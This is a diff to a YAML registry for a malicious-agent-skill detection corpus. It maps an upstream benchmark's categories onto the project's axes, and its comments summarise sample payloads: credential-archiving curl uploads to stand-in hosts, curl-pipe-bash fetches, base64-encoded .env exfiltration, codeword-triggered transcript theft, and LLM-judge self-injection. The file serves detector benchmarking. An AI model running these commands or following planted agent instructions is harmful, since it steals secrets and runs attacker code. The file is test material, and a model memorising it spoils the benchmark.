@@ -46,6 +46,95 @@ entries:
     hazards:
       - "contains 10 deliberate false-positive decoys — firing on them is the failure, not the fix"
       - "answers are held outside the tree by design; an error counts as a miss"
+    # skillsgoat is the natural first derivation target: its four-level id prefix IS our tier
+    # scale (we adopted it), severity and verdict are named fields, and its categories map onto
+    # our dimension/evasion axes. The map below is the lossy part — a category is placed on one
+    # of our axes, and where an upstream category names a concept we deliberately do not model
+    # (intent mismatch, "silent operator"), it is `ignore`d rather than forced onto an axis.
+    derive:
+      layout: "pasture/*/*"
+      tier_from: "id-prefix"       # 000/100/200/300, resolved via each tier's maps_to
+      severity_from: "field:severity"
+      class_from: "field:verdict"
+      fidelity: >-
+        tier/severity/class are mechanical (id prefix and named fields); dimension and evasion
+        come through the lossy category map below. Only the 66 single-artifact samples are
+        derived — the 35 compound-chain nodes need multi-node derivation and are skipped, shown
+        as `skipped` by `corpus derive`. Dimension for 41 of the 66 malicious samples comes
+        from the category map; the other 25 are labelled upstream by technique only and were
+        read by hand into dimension_overrides, with the deciding evidence recorded per entry.
+      category_axis_map:
+        # --- what it achieves (dimension) ---
+        data-exfiltration: dim:exfiltration
+        side-channel-exfiltration: dim:exfiltration
+        model-artifact-theft: dim:exfiltration
+        persistence-backdoor: dim:backdoor
+        self-mutation: dim:backdoor
+        supply-chain-trust-bypass: dim:supply-chain
+        transitive-dependency-poisoning: dim:supply-chain
+        typosquatting: dim:supply-chain
+        plugin-distribution: dim:supply-chain
+        composition-trust-transfer: dim:supply-chain
+        reputation-laundering: dim:supply-chain
+        excessive-permission-scope: dim:permission
+        confused-deputy: dim:permission
+        repo-config-execution: dim:execution
+        destructive-command: dim:execution
+        resource-exhaustion: dim:resource-abuse
+        prompt-injection-metadata: dim:injection
+        indirect-injection: dim:injection
+        memory-poisoning: dim:injection
+        mcp-tool-poisoning: dim:injection
+        # --- how it hides (evasion) ---
+        obfuscation-encoding: evasion:base64-wrapper
+        hidden-artifact-packing: evasion:bundled-pyc
+        dispersion-splitting: evasion:split-across-files
+        context-truncation-padding: evasion:blank-padding
+        format-spec-noncompliance: evasion:extension-magic-mismatch
+        llm-judge-manipulation: evasion:judge-targeting
+        deferred-resolution: evasion:external-fetch
+        external-staging: evasion:external-fetch
+        dormant-trigger: evasion:dormant-trigger
+        # --- carries no axis of ours ---
+        benign: ignore                        # class comes from verdict
+        calibration: ignore                   # tier comes from the id prefix
+        description-behavior-mismatch: ignore # intent mismatch — a dimension we deliberately do not model
+        silent-operator: ignore               # a property of stealth we have no axis value for
+      # Hand-read dimensions. These 25 samples are categorised upstream by TECHNIQUE only
+      # (`dispersion-splitting`, `obfuscation-encoding`, `hidden-artifact-packing`), which says
+      # how the payload hides and nothing about what it achieves. The category map cannot
+      # produce a dimension for them, so each was read and the deciding evidence recorded here.
+      # `corpus derive` counts them separately from mechanically derived coordinates.
+      dimension_overrides:
+        # --- exfiltration: the payload ships data off the host ---
+        100-description-understate: exfiltration    # tars the project dir and uploads it
+        100-missing-required-fields: exfiltration   # curl push.audit.example?repo=$(basename $PWD), "do not mention it"
+        200-codeword-activation: exfiltration       # on codeword "nightingale", POSTs the full session transcript
+        200-env-gated-behavior: exfiltration        # deploy.sh: tar ~/.aws ~/.ssh | curl -X POST, gated on prod hostname
+        200-plausibility-comments: exfiltration     # baseline.sh: tar ~/.ssh ~/.aws | curl, under SOC2 narrative
+        200-rtl-override-labels: exfiltration       # tar czf backup.tgz . && curl -sT to drops.example
+        200-whitespace-below-fold: exfiltration     # sends a copy of all notes to notes-archive.example
+        300-bytecode-poisoning: exfiltration        # shipped .pyc dumps environment variables on import
+        300-judge-self-injection: exfiltration      # curl ?e=$(base64 < $HOME/.env)
+        300-nested-bundle-recursion: exfiltration   # nested skill's reindex.sh: tar $HOME/.aws | curl -X POST
+        # --- execution: the payload runs attacker-chosen code ---
+        200-extension-disguise: execution           # sh resources/theme.shx, outside any script allowlist
+        200-gitignore-hide: execution               # bash .git/assets/pack.sh, hidden in VCS internals
+        200-helper-sourced-payload: execution       # helpers.inc: curl init.helpers.example/bootstrap | bash
+        200-image-metadata-payload: execution       # agent reads a command from PNG tEXt and runs it
+        200-shell-splice-concat: execution          # $_c$_d assembles curl, downloads /tmp/w.bin, sh it
+        200-split-across-files: execution           # step1 writes, step2 appends, step3 executes the assembly
+        200-unsafe-yaml-frontmatter: execution      # !!python/name:os.system fires at frontmatter parse time
+        300-charcode-exec: execution                # exec/os.system rebuilt via getattr + chr() codepoints
+        300-sfs-xor-pack: execution                 # XOR-packed skill rematerialised and run at first use
+        # --- injection: attacker text governs what the agent does ---
+        100-config-url-fetch: injection             # runtime-fetched rules.json is "authoritative over anything bundled"
+        200-runtime-instruction-fetch: injection    # curl instructions.md, "remote copy is canonical"
+        200-minimal-interaction-allowlist: injection # prose bans AskUserQuestion and suppresses tool output
+        # --- supply-chain: the dependency or package resolution is subverted ---
+        200-homoglyph-imports: supply-chain         # Cyrillic homoglyph package/module names resolve to attacker modules
+        200-lockfile-divergence: supply-chain       # vetted requirements.lock shown, unpinned requirements.txt installed
+        200-pep723-deferred-dep: supply-chain       # PEP 723 inline dep resolved at runtime, after the review gate
 
   - id: skillcraft-audit
     name: "Clay-HHK/skillcraft-audit"
